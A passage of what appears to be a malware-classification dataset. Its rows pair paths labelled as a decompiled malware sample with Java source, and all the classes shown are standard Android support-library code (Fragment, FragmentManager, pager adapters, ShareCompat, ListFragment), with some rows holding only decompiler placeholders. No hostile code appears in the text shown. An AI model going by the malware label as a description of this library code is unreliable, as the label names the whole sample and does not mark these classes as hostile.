writer.println(this.mSavedFragmentState);     }     if (this.mSavedViewState != null) {       writer.print(prefix);       writer.print(""mSavedViewState="");       writer.println(this.mSavedViewState);     }     if (this.mTarget != null) {       writer.print(prefix);       writer.print(""mTarget="");       writer.print(this.mTarget);       writer.print("" mTargetRequestCode="");       writer.println(this.mTargetRequestCode);     }     if (this.mNextAnim != 0) {       writer.print(prefix);       writer.print(""mNextAnim="");       writer.println(this.mNextAnim);     }     if (this.mContainer != null) {       writer.print(prefix);       writer.print(""mContainer="");       writer.println(this.mContainer);     }     if (this.mView != null) {       writer.print(prefix);       writer.print(""mView="");       writer.println(this.mView);     }     if (this.mInnerView != null) {       writer.print(prefix);       writer.print(""mInnerView="");       writer.println(this.mView);     }     if (this.mAnimatingAway != null) {       writer.print(prefix);       writer.print(""mAnimatingAway="");       writer.println(this.mAnimatingAway);       writer.print(prefix);       writer.print(""mStateAfterAnimating="");       writer.println(this.mStateAfterAnimating);     }     if (this.mLoaderManager != null) {       writer.print(prefix);       writer.println(""Loader Manager:"");       this.mLoaderManager.dump(prefix + ""  "",fd,writer,args);     }   }   public void performStart(){     onStart();     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportStart();     }   }   public void performStop(){     onStop();   }   public void performReallyStop(){     if (this.mLoadersStarted) {       this.mLoadersStarted=false;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mIndex,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         if (!this.mActivity.mRetaining) {           this.mLoaderManager.doStop();         }  else {           this.mLoaderManager.doRetain();         }       }     }   }   public void performDestroyView(){     onDestroyView();     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportNextStart();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@13908f9c"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentManager.code","public abstract class FragmentManager {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface BackStackEntry {     CharSequence getBreadCrumbShortTitle();     int getBreadCrumbShortTitleRes();     CharSequence getBreadCrumbTitle();     int getBreadCrumbTitleRes();     int getId();     String getName();   } public interface OnBackStackChangedListener {     void onBackStackChanged();   }   public abstract void addOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract FragmentTransaction beginTransaction();   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract boolean executePendingTransactions();   public abstract Fragment findFragmentById(  int i);   public abstract Fragment findFragmentByTag(  String str);   public abstract BackStackEntry getBackStackEntryAt(  int i);   public abstract int getBackStackEntryCount();   public abstract Fragment getFragment(  Bundle bundle,  String str);   public abstract void popBackStack();   public abstract void popBackStack(  int i,  int i2);   public abstract void popBackStack(  String str,  int i);   public abstract boolean popBackStackImmediate();   public abstract boolean popBackStackImmediate(  int i,  int i2);   public abstract boolean popBackStackImmediate(  String str,  int i);   public abstract void putFragment(  Bundle bundle,  String str,  Fragment fragment);   public abstract void removeOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract Fragment.SavedState saveFragmentInstanceState(  Fragment fragment);   @Deprecated public FragmentTransaction openTransaction(){     return beginTransaction();   }   public static void enableDebugLogging(  boolean enabled){     FragmentManagerImpl.DEBUG=enabled;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentManagerImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4d9cf71d"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel in){       return new FragmentManagerState(in);     }     @Override public FragmentManagerState[] newArray(    int size){       return new FragmentManagerState[size];     }   } ;   FragmentState[] mActive;   int[] mAdded;   BackStackState[] mBackStack;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel in){     this.mActive=(FragmentState[])in.createTypedArray(FragmentState.CREATOR);     this.mAdded=in.createIntArray();     this.mBackStack=(BackStackState[])in.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeTypedArray(this.mActive,flags);     dest.writeIntArray(this.mAdded);     dest.writeTypedArray(this.mBackStack,flags);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentPagerAdapter.code","public abstract class FragmentPagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentPagerAdapter"";   private FragmentTransaction mCurTransaction=null;   private Fragment mCurrentPrimaryItem=null;   private final FragmentManager mFragmentManager;   public abstract Fragment getItem(  int i);   public FragmentPagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     long itemId=getItemId(position);     String name=makeFragmentName(container.getId(),itemId);     Fragment fragment=this.mFragmentManager.findFragmentByTag(name);     if (fragment != null) {       this.mCurTransaction.attach(fragment);     }  else {       fragment=getItem(position);       this.mCurTransaction.add(container.getId(),fragment,makeFragmentName(container.getId(),itemId));     }     if (fragment != this.mCurrentPrimaryItem) {       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);     }     return fragment;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     this.mCurTransaction.detach((Fragment)object);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     return null;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){   }   public long getItemId(  int position){     return position;   }   private static String makeFragmentName(  int viewId,  long id){     return ""android:switcher:"" + viewId + "":""+ id;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel in){       return new FragmentState(in);     }     @Override public FragmentState[] newArray(    int size){       return new FragmentState[size];     }   } ;   final Bundle mArguments;   final String mClassName;   final int mContainerId;   final boolean mDetached;   final int mFragmentId;   final boolean mFromLayout;   final int mIndex;   Fragment mInstance;   final boolean mRetainInstance;   Bundle mSavedFragmentState;   final String mTag;   public FragmentState(  Fragment frag){     this.mClassName=frag.getClass().getName();     this.mIndex=frag.mIndex;     this.mFromLayout=frag.mFromLayout;     this.mFragmentId=frag.mFragmentId;     this.mContainerId=frag.mContainerId;     this.mTag=frag.mTag;     this.mRetainInstance=frag.mRetainInstance;     this.mDetached=frag.mDetached;     this.mArguments=frag.mArguments;   }   public FragmentState(  Parcel in){     this.mClassName=in.readString();     this.mIndex=in.readInt();     this.mFromLayout=in.readInt() != 0;     this.mFragmentId=in.readInt();     this.mContainerId=in.readInt();     this.mTag=in.readString();     this.mRetainInstance=in.readInt() != 0;     this.mDetached=in.readInt() != 0;     this.mArguments=in.readBundle();     this.mSavedFragmentState=in.readBundle();   }   public Fragment instantiate(  FragmentActivity activity){     if (this.mInstance != null) {       return this.mInstance;     }     if (this.mArguments != null) {       this.mArguments.setClassLoader(activity.getClassLoader());     }     this.mInstance=Fragment.instantiate(activity,this.mClassName,this.mArguments);     if (this.mSavedFragmentState != null) {       this.mSavedFragmentState.setClassLoader(activity.getClassLoader());       this.mInstance.mSavedFragmentState=this.mSavedFragmentState;     }     this.mInstance.setIndex(this.mIndex);     this.mInstance.mFromLayout=this.mFromLayout;     this.mInstance.mRestored=true;     this.mInstance.mFragmentId=this.mFragmentId;     this.mInstance.mContainerId=this.mContainerId;     this.mInstance.mTag=this.mTag;     this.mInstance.mRetainInstance=this.mRetainInstance;     this.mInstance.mDetached=this.mDetached;     this.mInstance.mFragmentManager=activity.mFragments;     if (FragmentManagerImpl.DEBUG) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.mInstance);     }     return this.mInstance;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeString(this.mClassName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mFromLayout ? 1 : 0);     dest.writeInt(this.mFragmentId);     dest.writeInt(this.mContainerId);     dest.writeString(this.mTag);     dest.writeInt(this.mRetainInstance ? 1 : 0);     dest.writeInt(this.mDetached ? 1 : 0);     dest.writeBundle(this.mArguments);     dest.writeBundle(this.mSavedFragmentState);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentStatePagerAdapter.code","public abstract class FragmentStatePagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentStatePagerAdapter"";   private final FragmentManager mFragmentManager;   private FragmentTransaction mCurTransaction=null;   private ArrayList<Fragment.SavedState> mSavedState=new ArrayList<>();   private ArrayList<Fragment> mFragments=new ArrayList<>();   private Fragment mCurrentPrimaryItem=null;   public abstract Fragment getItem(  int i);   public FragmentStatePagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     Fragment.SavedState fss;     Fragment f;     if (this.mFragments.size() <= position || (f=this.mFragments.get(position)) == null) {       if (this.mCurTransaction == null) {         this.mCurTransaction=this.mFragmentManager.beginTransaction();       }       Fragment fragment=getItem(position);       if (this.mSavedState.size() > position && (fss=this.mSavedState.get(position)) != null) {         fragment.setInitialSavedState(fss);       }       while (this.mFragments.size() <= position) {         this.mFragments.add(null);       }       fragment.setMenuVisibility(DEBUG);       this.mFragments.set(position,fragment);       this.mCurTransaction.add(container.getId(),fragment);       return fragment;     }     return f;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     while (this.mSavedState.size() <= position) {       this.mSavedState.add(null);     }     this.mSavedState.set(position,this.mFragmentManager.saveFragmentInstanceState(fragment));     this.mFragments.set(position,null);     this.mCurTransaction.remove(fragment);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     Bundle state=null;     if (this.mSavedState.size() > 0) {       state=new Bundle();       Fragment.SavedState[] fss=new Fragment.SavedState[this.mSavedState.size()];       this.mSavedState.toArray(fss);       state.putParcelableArray(""states"",fss);     }     for (int i=0; i < this.mFragments.size(); i++) {       Fragment f=this.mFragments.get(i);       if (f != null) {         if (state == null) {           state=new Bundle();         }         String key=""f"" + i;         this.mFragmentManager.putFragment(state,key,f);       }     }     return state;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){     if (state != null) {       Bundle bundle=(Bundle)state;       bundle.setClassLoader(loader);       Parcelable[] fss=bundle.getParcelableArray(""states"");       this.mSavedState.clear();       this.mFragments.clear();       if (fss != null) {         for (        Parcelable parcelable : fss) {           this.mSavedState.add((Fragment.SavedState)parcelable);         }       }       Iterable<String> keys=bundle.keySet();       for (      String key : keys) {         if (key.startsWith(""f"")) {           int index=Integer.parseInt(key.substring(1));           Fragment f=this.mFragmentManager.getFragment(bundle,key);           if (f != null) {             while (this.mFragments.size() <= index) {               this.mFragments.add(null);             }             f.setMenuVisibility(DEBUG);             this.mFragments.set(index,f);           }  else {             Log.w(TAG,""Bad fragment at key "" + key);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentTag.code","static class FragmentTag {   public static final int[] Fragment={R.attr.name,R.attr.id,R.attr.tag};   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   FragmentTag(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\FragmentTransaction.code","public abstract class FragmentTransaction {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1;   public abstract FragmentTransaction add(  int i,  Fragment fragment);   public abstract FragmentTransaction add(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction add(  Fragment fragment,  String str);   public abstract FragmentTransaction addToBackStack(  String str);   public abstract FragmentTransaction attach(  Fragment fragment);   public abstract int commit();   public abstract int commitAllowingStateLoss();   public abstract FragmentTransaction detach(  Fragment fragment);   public abstract FragmentTransaction disallowAddToBackStack();   public abstract FragmentTransaction hide(  Fragment fragment);   public abstract boolean isAddToBackStackAllowed();   public abstract boolean isEmpty();   public abstract FragmentTransaction remove(  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction setBreadCrumbShortTitle(  int i);   public abstract FragmentTransaction setBreadCrumbShortTitle(  CharSequence charSequence);   public abstract FragmentTransaction setBreadCrumbTitle(  int i);   public abstract FragmentTransaction setBreadCrumbTitle(  CharSequence charSequence);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2,  int i3,  int i4);   public abstract FragmentTransaction setTransition(  int i);   public abstract FragmentTransaction setTransitionStyle(  int i);   public abstract FragmentTransaction show(  Fragment fragment); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\InstantiationException.code","public static class InstantiationException extends RuntimeException {   public InstantiationException(  String msg,  Exception cause){     super(msg,cause);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\IntentBuilder.code","public static class IntentBuilder {   private Activity mActivity;   private ArrayList<String> mBccAddresses;   private ArrayList<String> mCcAddresses;   private CharSequence mChooserTitle;   private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");   private ArrayList<Uri> mStreams;   private ArrayList<String> mToAddresses;   public static IntentBuilder from(  Activity launchingActivity){     return new IntentBuilder(launchingActivity);   }   private IntentBuilder(  Activity launchingActivity){     this.mActivity=launchingActivity;     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());     this.mIntent.addFlags(524288);   }   public Intent getIntent(){     if (this.mToAddresses != null) {       combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);       this.mToAddresses=null;     }     if (this.mCcAddresses != null) {       combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);       this.mCcAddresses=null;     }     if (this.mBccAddresses != null) {       combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);       this.mBccAddresses=null;     }     boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;     boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     if (!needsSendMultiple && isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }       this.mStreams=null;     }     if (needsSendMultiple && !isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }     }     return this.mIntent;   }   Activity getActivity(){     return this.mActivity;   }   private void combineArrayExtra(  String extra,  ArrayList<String> add){     String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);     int currentLength=currentAddresses != null ? currentAddresses.length : 0;     String[] finalAddresses=new String[add.size() + currentLength];     add.toArray(finalAddresses);     if (currentAddresses != null) {       System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);     }     this.mIntent.putExtra(extra,finalAddresses);   }   private void combineArrayExtra(  String extra,  String[] add){     Intent intent=getIntent();     String[] old=intent.getStringArrayExtra(extra);     int oldLength=old != null ? old.length : 0;     String[] result=new String[add.length + oldLength];     if (old != null) {       System.arraycopy(old,0,result,0,oldLength);     }     System.arraycopy(add,0,result,oldLength,add.length);     intent.putExtra(extra,result);   }   public Intent createChooserIntent(){     return Intent.createChooser(getIntent(),this.mChooserTitle);   }   public void startChooser(){     this.mActivity.startActivity(createChooserIntent());   }   public IntentBuilder setChooserTitle(  CharSequence title){     this.mChooserTitle=title;     return this;   }   public IntentBuilder setChooserTitle(  int resId){     return setChooserTitle(this.mActivity.getText(resId));   }   public IntentBuilder setType(  String mimeType){     this.mIntent.setType(mimeType);     return this;   }   public IntentBuilder setText(  CharSequence text){     this.mIntent.putExtra(""android.intent.extra.TEXT"",text);     return this;   }   public IntentBuilder setHtmlText(  String htmlText){     this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);     if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {       setText(Html.fromHtml(htmlText));     }     return this;   }   public IntentBuilder setStream(  Uri streamUri){     if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {       this.mIntent.setAction(""android.intent.action.SEND"");     }     this.mStreams=null;     this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);     return this;   }   public IntentBuilder addStream(  Uri streamUri){     Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     if (currentStream == null) {       return setStream(streamUri);     }     if (this.mStreams == null) {       this.mStreams=new ArrayList<>();     }     if (currentStream != null) {       this.mIntent.removeExtra(""android.intent.extra.STREAM"");       this.mStreams.add(currentStream);     }     this.mStreams.add(streamUri);     return this;   }   public IntentBuilder setEmailTo(  String[] addresses){     if (this.mToAddresses != null) {       this.mToAddresses=null;     }     this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder addEmailTo(  String address){     if (this.mToAddresses == null) {       this.mToAddresses=new ArrayList<>();     }     this.mToAddresses.add(address);     return this;   }   public IntentBuilder addEmailTo(  String[] addresses){     combineArrayExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder setEmailCc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder addEmailCc(  String address){     if (this.mCcAddresses == null) {       this.mCcAddresses=new ArrayList<>();     }     this.mCcAddresses.add(address);     return this;   }   public IntentBuilder addEmailCc(  String[] addresses){     combineArrayExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder setEmailBcc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder addEmailBcc(  String address){     if (this.mBccAddresses == null) {       this.mBccAddresses=new ArrayList<>();     }     this.mBccAddresses.add(address);     return this;   }   public IntentBuilder addEmailBcc(  String[] addresses){     combineArrayExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder setSubject(  String subject){     this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);     return this;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\IntentReader.code","public static class IntentReader {   private static final String TAG=""IntentReader"";   private Activity mActivity;   private ComponentName mCallingActivity;   private String mCallingPackage;   private Intent mIntent;   private ArrayList<Uri> mStreams;   public static IntentReader from(  Activity activity){     return new IntentReader(activity);   }   private IntentReader(  Activity activity){     this.mActivity=activity;     this.mIntent=activity.getIntent();     this.mCallingPackage=ShareCompat.getCallingPackage(activity);     this.mCallingActivity=ShareCompat.getCallingActivity(activity);   }   public boolean isShareIntent(){     String action=this.mIntent.getAction();     return action.equals(""android.intent.action.SEND"") || action.equals(""android.intent.action.SEND_MULTIPLE"");   }   public boolean isSingleShare(){     return this.mIntent.getAction().equals(""android.intent.action.SEND"");   }   public boolean isMultipleShare(){     return this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");   }   public String getType(){     return this.mIntent.getType();   }   public CharSequence getText(){     return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");   }   public String getHtmlText(){     String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);     if (this.mIntent == null) {       CharSequence text=getText();       if (text instanceof Spanned) {         return Html.toHtml((Spanned)text);       }       if (text != null) {         return ShareCompat.IMPL.escapeHtml(text);       }       return result;     }     return result;   }   public Uri getStream(){     return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");   }   public Uri getStream(  int index){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.get(index);     }     if (index == 0) {       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);   }   public int getStreamCount(){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.size();     }     return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;   }   public String[] getEmailTo(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");   }   public String[] getEmailCc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");   }   public String[] getEmailBcc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");   }   public String getSubject(){     return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");   }   public String getCallingPackage(){     return this.mCallingPackage;   }   public ComponentName getCallingActivity(){     return this.mCallingActivity;   }   public Drawable getCallingActivityIcon(){     if (this.mCallingActivity == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getActivityIcon(this.mCallingActivity);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling activity"",e);       return null;     }   }   public Drawable getCallingApplicationIcon(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationIcon(this.mCallingPackage);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling application"",e);       return null;     }   }   public CharSequence getCallingApplicationLabel(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve label for calling application"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ListFragment.code","public class ListFragment extends Fragment {   static final int INTERNAL_EMPTY_ID=16711681;   static final int INTERNAL_LIST_CONTAINER_ID=16711683;   static final int INTERNAL_PROGRESS_CONTAINER_ID=16711682;   ListAdapter mAdapter;   CharSequence mEmptyText;   View mEmptyView;   ListView mList;   View mListContainer;   boolean mListShown;   View mProgressContainer;   TextView mStandardEmptyView;   private final Handler mHandler=new Handler();   private final Runnable mRequestFocus=new Runnable(){     @Override public void run(){       ListFragment.this.mList.focusableViewAvailable(ListFragment.this.mList);     }   } ;   private final AdapterView.OnItemClickListener mOnClickListener=new AdapterView.OnItemClickListener(){     @Override public void onItemClick(    AdapterView<?> parent,    View v,    int position,    long id){       ListFragment.this.onListItemClick((ListView)parent,v,position,id);     }   } ;   @Override public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     Context context=getActivity();     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout pframe=new LinearLayout(context);     pframe.setId(INTERNAL_PROGRESS_CONTAINER_ID);     pframe.setOrientation(1);     pframe.setVisibility(8);     pframe.setGravity(17);     ProgressBar progress=new ProgressBar(context,null,R.attr.progressBarStyleLarge);     pframe.addView(progress,new FrameLayout.LayoutParams(-2,-2));     frameLayout.addView(pframe,new FrameLayout.LayoutParams(-1,-1));     FrameLayout lframe=new FrameLayout(context);     lframe.setId(INTERNAL_LIST_CONTAINER_ID);     TextView tv=new TextView(getActivity());     tv.setId(INTERNAL_EMPTY_ID);     tv.setGravity(17);     lframe.addView(tv,new FrameLayout.LayoutParams(-1,-1));     ListView lv=new ListView(getActivity());     lv.setId(R.id.list);     lv.setDrawSelectorOnTop(false);     lframe.addView(lv,new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(lframe,new FrameLayout.LayoutParams(-1,-1));     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     return frameLayout;   }   @Override public void onViewCreated(  View view,  Bundle savedInstanceState){     super.onViewCreated(view,savedInstanceState);     ensureList();   }   @Override public void onDestroyView(){     this.mHandler.removeCallbacks(this.mRequestFocus);     this.mList=null;     this.mListShown=false;     this.mListContainer=null;     this.mProgressContainer=null;     this.mEmptyView=null;     this.mStandardEmptyView=null;     super.onDestroyView();   }   public void onListItemClick(  ListView l,  View v,  int position,  long id){   }   public void setListAdapter(  ListAdapter adapter){     boolean hadAdapter=this.mAdapter != null;     this.mAdapter=adapter;     if (this.mList != null) {       this.mList.setAdapter(adapter);       if (!this.mListShown && !hadAdapter) {         setListShown(true,getView().getWindowToken() != null);       }     }   }   public void setSelection(  int position){     ensureList();     this.mList.setSelection(position);   }   public int getSelectedItemPosition(){     ensureList();     return this.mList.getSelectedItemPosition();   }   public long getSelectedItemId(){     ensureList();     return this.mList.getSelectedItemId();   }   public ListView getListView(){     ensureList();     return this.mList;   }   public void setEmptyText(  CharSequence text){     ensureList();     if (this.mStandardEmptyView == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     this.mStandardEmptyView.setText(text);     if (this.mEmptyText == null) {       this.mList.setEmptyView(this.mStandardEmptyView);     }     this.mEmptyText=text;   }   public void setListShown(  boolean shown){     setListShown(shown,true);   }   public void setListShownNoAnimation(  boolean shown){     setListShown(shown,false);   }   private void setListShown(  boolean shown,  boolean animate){     ensureList();     if (this.mProgressContainer == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     if (this.mListShown != shown) {       this.mListShown=shown;       if (shown) {         if (animate) {           this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));           this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         }  else {           this.mProgressContainer.clearAnimation();           this.mListContainer.clearAnimation();         }         this.mProgressContainer.setVisibility(8);         this.mListContainer.setVisibility(0);         return;       }       if (animate) {         this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));       }  else {         this.mProgressContainer.clearAnimation();         this.mListContainer.clearAnimation();       }       this.mProgressContainer.setVisibility(0);       this.mListContainer.setVisibility(8);     }   }   public ListAdapter getListAdapter(){     return this.mAdapter;   }   private void ensureList(){     if (this.mList == null) {       View root=getView();       if (root == null) {         throw new IllegalStateException(""Content view not yet created"");       }       if (root instanceof ListView) {         this.mList=(ListView)root;       }  else {         